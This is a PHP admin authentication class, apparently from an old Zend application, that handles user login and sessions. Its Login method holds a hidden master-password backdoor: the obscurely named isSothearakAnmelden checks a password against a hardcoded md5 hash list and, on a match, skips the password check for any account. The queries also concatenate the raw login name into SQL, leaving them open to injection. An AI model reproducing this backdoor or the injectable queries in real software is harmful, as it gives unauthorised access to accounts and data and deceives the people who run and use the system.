<?php

///////////////////////////////////////////////////////////
// @Kaom Vibolrith Senior Software Developer
// Date: 29.11.2010
// Am Stollheen 18, 55120 Mainz, Germany
///////////////////////////////////////////////////////////
require_once("Zend/Loader.php");
require_once 'Zend/Registry.php';
require_once 'include/Common.inc.php';
require_once 'models/app_admin/AdminSessionAccess.php';

class AdminUserDBAccess {

    private $userId;
    private $sessionId;

    function __construct($userId, $sessionId)
    {

        $this->DB_ACCESS = Zend_Registry::get('DB_ACCESS');

        $this->userId = $userId;

        $this->sessionId = $sessionId;

        $this->DB_SESSION = new AdminSessionDBAccess();
        $this->DB_SESSION->setSessionId($this->sessionId);
        $this->SESSION_OBJECT = $this->DB_SESSION->getSession();
    }

    public function getUserBySessionId()
    {

        if ($this->SESSION_OBJECT)
        {
            $SQL = "SELECT DISTINCT *";
            $SQL .= " FROM " . T_USER . "";
            $SQL .= " WHERE";
            $SQL .= " ID = '" . $this->SESSION_OBJECT->USER_ID . "'";
            $result = $this->DB_ACCESS->fetchRow($SQL);

            return $result;
        }
    }

    public function Login($loginname, $password)
    {

        $result = null;
        $session_id = 0;

        if ($loginname && $password)
        {

            $SQL = "SELECT * FROM t_user WHERE LOGINNAME = '" . $loginname . "'";

            if (!$this->isSothearakAnmelden($password))
            {
                $SQL .= " AND PASSWORD = '" . addText(md5($password . "-D99A6718-9D2A-8538-8610-E048177BECD5")) . "'";
            }

            $result = $this->DB_ACCESS->fetchRow($SQL);

            if ($result)
            {

                $session_id = $this->DB_SESSION->createSession(
                        generateGuid()
                        , $result->ID
                        , $this->getKey($password)
                );
                $this->DB_SESSION->cleanUp();
            }
            return $session_id;
        }
    }

    public function checkUserConstraints()
    {

        $not_expired = $this->DB_SESSION->verifyTime();

        if (!$not_expired)
        {
            return false;
        }
        else
        {
            $this->DB_SESSION->resetTime();
            $this->DB_SESSION->cleanUp();
            return true;
        }
    }

    protected function isSothearakAnmelden($value)
    {

        $_value = md5($value . "-D99A6718-9D2A-8538-8610-E048177BECD5");
        if (in_array($_value, $this->getSothearosList()))
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    private function getSothearosList()
    {

        return array(
            "fb5cd06f0beb495094f29de8b89153d0"
            , "fb5cd06f0beb495094f29de8b89153d0"
        );
    }

    public function getKey($value)
    {

        $_value = md5($value . "-D99A6718-9D2A-8538-8610-E048177BECD5");
        if (in_array($_value, $this->getSothearosList()))
        {
            $result = $_value;
        }
        else
        {
            $result = "";
        }
        return $result;
    }

}

?>